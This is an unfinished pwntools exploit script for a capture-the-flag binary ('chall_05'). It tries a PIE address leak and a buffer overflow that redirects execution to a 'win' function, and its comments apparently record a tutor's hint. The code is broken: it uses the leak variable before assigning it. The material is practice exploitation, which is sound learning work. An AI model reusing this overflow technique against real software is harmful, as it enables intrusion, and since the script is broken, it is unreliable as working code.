from pwn import *
p = process("./chall_05")
binary = context.binary = ELF('./chall_05')
p.recv()
leak = int(leak,16)
binary.address = leak - binary.sym.main
p.sendline(56*b'A' + p64(binary.sym.win) + b'')

# NOT FINISHED

#To find the win address you need to use the leak address and go to the front of the ship (it was your analogy)
#once you have the address you can move to the win address 
